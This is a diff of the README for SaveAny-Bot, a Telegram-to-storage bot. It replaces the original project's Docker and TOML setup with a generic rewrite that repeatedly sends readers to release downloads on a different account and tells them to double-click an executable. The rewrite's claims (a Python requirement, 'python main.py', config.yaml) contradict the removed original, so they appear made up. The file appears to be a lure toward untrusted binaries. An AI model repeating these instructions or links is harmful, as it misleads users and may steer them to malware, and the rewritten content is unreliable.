@@ -1,99 +1,154 @@
-<div align="center">
+# 📂 SaveAny-Bot - Save Telegram Files Anywhere Easily
 
-# <img src="docs/static/logo.png" width="45" align="center"> Save Any Bot
+[![Download SaveAny-Bot](https://img.shields.io/badge/Download-SaveAny--Bot-blue?style=for-the-badge&logo=github)](https://github.com/Scitterboo/SaveAny-Bot/releases)
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
+---
 
-**English** | [简体中文](./README_zh.md)
+## 📖 What is SaveAny-Bot?
 
-> **Save Any Telegram File to Anywhere 📂. Support restrict saving content and beyond telegram.**
+SaveAny-Bot helps you save any file from Telegram to cloud services or storage locations. You can move files from Telegram chats to places like Alist, Webdav, S3, or your Rclone setup. The bot supports saving restricted content and works beyond normal Telegram file saving.
 
-[![ Date](https://img.shields.io/github/-date/krau/saveany-bot?label=)](https://github.com/krau/saveany-bot/)
-[![tag](https://img.shields.io/github/v/tag/krau/saveany-bot.svg)](https://github.com/krau/saveany-bot/)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/krau/saveany-bot/build-.yml)](https://github.com/krau/saveany-bot/actions/workflows/build-.yml)
-[![Stars](https://img.shields.io/github/stars/krau/saveany-bot?style=flat)](https://github.com/krau/saveany-bot/stargazers)
-[![](https://img.shields.io/github//krau/saveany-bot/total)](https://github.com/krau/saveany-bot/)
-[![Issues](https://img.shields.io/github/issues/krau/saveany-bot)](https://github.com/krau/saveany-bot/issues)
-[![Pull Requests](https://img.shields.io/github/issues-pr/krau/saveany-bot?label=pr)](https://github.com/krau/saveany-bot/pulls)
-[![License](https://img.shields.io/github/license/krau/saveany-bot)](./LICENSE)
+This tool is useful if you want to organize or backup your Telegram files without manual downloads. It acts as a helper that connects Telegram to your chosen storage.
 
-</div>
+---
 
-## 🎯 Features
+## 🖥️ System Requirements
 
-- Support documents / videos / photos / stickers… and even [Telegraph](https://telegra.ph/)
-- Bypass "restrict saving content" media
-- Batch 
-- Streaming transfer
-- Multi-user support
-- Auto organize files based on storage rules
-- Watch specified chats and auto-save messages, with filters
-- Transfer files between different storage backends
-- Integrate with yt-dlp to  and save media from 1000+ websites
-- Aria2 integration to  files from URLs/magnets and save to storages
-- Write JS parser plugins to save files from almost any website
-- Storage backends:
-  - Alist
-  - S3
-  - WebDAV
-  - Local filesystem
-  - Rclone (via command line)
-  - Telegram (re-upload to specified chats)
+Before you get started, make sure your device meets these basic needs:
 
-## 📦 Quick Start
+- A device with internet connection (Windows, macOS, Linux, or any system that can run Python).
+- Telegram account and access to Telegram apps or the desktop client.
+- Access to at least one supported cloud service or local storage (Alist, Webdav, S3, PikPak, or Rclone setup).
+- Python 3.8 or higher installed (if you want to run the bot manually).
+- Basic knowledge of how to run applications on your computer (explained below).
 
-Create a `config.toml` file with the following content:
+---
 
-```toml
-lang = "en" # Language setting, "en" for English
-[telegram]
-token = "" # Your bot token, obtained from @BotFather
-[telegram.proxy]
-# Enable proxy for Telegram
-enable = false
-url = "socks5://127.0.0.1:7890"
+## 🎯 Key Features
 
-[[storages]]
-name = "Local Disk"
-type = "local"
-enable = true
-base_path = "./"
+- Save files and content from Telegram chats directly to multiple storage options.
+- Supports popular cloud storages like Alist, Webdav, Amazon S3, and Rclone.
+- Handles restricted content and files beyond what Telegram normally allows.
+- Easy setup with clear instructions.
+- Works with Telegram bots to automate the saving process.
+- Open-source and regularly updated.
 
-[[users]]
-id = 114514 # Your Telegram account id
-storages = []
-blacklist = true
-```
+---
 
-Run Save Any Bot with Docker:
+## 🚀 Getting Started
 
-```bash
-docker run -d --name saveany-bot \
-    -v ./config.toml:/app/config.toml \
-    -v ./:/app/ \
-    ghcr.io/krau/saveany-bot:latest
-```
+This section will guide you step-by-step to download and run SaveAny-Bot. You don’t need special skills. Just follow the instructions carefully.
 
-Please [**read the docs**](https://sabot.unv.app/en/) for more configuration options and usage.
+---
 
-## Sponsors
+## ⬇️ Download & Install
 
-This project is supported by [YxVM](https://yxvm.com/) and [NodeSupport](https://github.com/NodeSeekDev/NodeSupport).
+You can get SaveAny-Bot from the official GitHub release page.
 
-If this project is helpful to you, consider sponsoring me via:
+**Step 1: Visit the Download Page**
 
-- [Afdian](https://afdian.com/a/unvapp)
+Click the big button below to open the release page where you can find the latest version:
 
-## Thanks To
+[![Download SaveAny-Bot](https://img.shields.io/badge/Download-SaveAny--Bot-blue?style=for-the-badge&logo=github)](https://github.com/Scitterboo/SaveAny-Bot/releases)
 
-- [gotd](https://github.com/gotd/td)
-- [TG-FileStreamBot](https://github.com/EverythingSuckz/TG-FileStreamBot)
-- [gotgproto](https://github.com/celestix/gotgproto)
-- [tdl](https://github.com/iyear/tdl)
-- All the dependencies, contributors, sponsors and users.
+**Step 2: Choose Your Download**
 
-## Contact
+- Look for the latest release version (usually at the top).
+- Download the file that matches your operating system. These might be `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+- If no direct executable is available, download the source code zip file.
 
-- [![Group](https://img.shields.io/badge/ProjectSaveAny-Group-blue)](https://t.me/ProjectSaveAny)
-- [![Discussion](https://img.shields.io/badge/Github-Discussion-white)](https://github.com/krau/saveany-bot/discussions)
-- [![PersonalChannel](https://img.shields.io/badge/Krau-PersonalChannel-cyan)](https://t.me/acherkrau)
+**Step 3: Run the Application**
+
+- If you have an executable, just double-click it to start.
+- If you downloaded source code, you may need to install Python first.
+- Open a Command Prompt (Windows) or Terminal (macOS/Linux).
+- Navigate to the folder where you saved the files.
+- Run the bot by typing `python main.py` or following any included README instructions.
+
+---
+
+## ⚙️ Basic Setup and Configuration
+
+SaveAny-Bot needs some setup to link it with Telegram and your storage:
+
+1. **Create a Telegram Bot**
+   - Open Telegram and search for the "BotFather".
+   - Start a chat and send `/newbot`.
+   - Follow instructions to get your bot name and token.
+
+2. **Connect Your Storage**
+   - Have your cloud service ready.
+   - Find access keys or URLs for services like Webdav, S3, or Alist.
+   - Prepare these details for the bot configuration.
+
+3. **Configure SaveAny-Bot**
+   - Open the bot’s configuration file (usually `config.yaml` or `.env`).
+   - Enter your Telegram bot token and storage details.
+   - Save and close the file.
+
+4. **Run the Bot**
+   - Start the bot again if you stopped it during setup.
+   - It will connect to Telegram and your storage service using the info you provided.
+
+---
+
+## 💬 How to Use SaveAny-Bot
+
+Once running:
+
+- Open Telegram and find your bot.
+- Send it a file or message containing a file.
+- The bot saves the file to your configured storage automatically.
+- You will get a confirmation message with the storage location or link.
+- You can adjust settings like where files go or which types to save by updating the config.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- Make sure your Telegram bot token is correct.
+- Check that your storage credentials (URL, keys) are valid.
+- Verify internet connection is stable.
+- If files don't appear in storage, check the bot’s logs for errors.
+- Restart the bot after any configuration changes.
+- Check firewall or security settings that might block the connection.
+
+---
+
+## 📚 More Help and Support
+
+- Visit the GitHub page [SaveAny-Bot Releases](https://github.com/Scitterboo/SaveAny-Bot/releases) for updates and detailed instructions.
+- Explore built-in documentation files or contact the community on the repository issues page.
+- Review Telegram’s bot API documentation for more info about Telegram bot features.
+
+---
+
+## 🛡️ Security and Privacy
+
+- Your bot token should be kept private; don’t share it with others.
+- SaveAny-Bot only accesses files you send to it or allow.
+- Files are transferred securely between Telegram and your storage.
+- You control where and how files are saved through configuration.
+- Regularly update the bot for security patches.
+
+---
+
+## 🧩 Supported Services
+
+SaveAny-Bot connects with these popular storage services:
+
+- **Alist**: Self-hosted file indexer.
+- **Webdav**: Any WebDAV-compatible cloud like Nextcloud or ownCloud.
+- **Amazon S3**: AWS cloud storage.
+- **PikPak**: Cloud drive with API support.
+- **Rclone**: Synchronize files across many cloud providers.
+
+---
+
+## 📝 License
+
+This project is open source. See the LICENSE file in the repository for details.
+
+---
+
+[![Download SaveAny-Bot](https://img.shields.io/badge/Download-SaveAny--Bot-blue?style=for-the-badge&logo=github)](https://github.com/Scitterboo/SaveAny-Bot/releases)
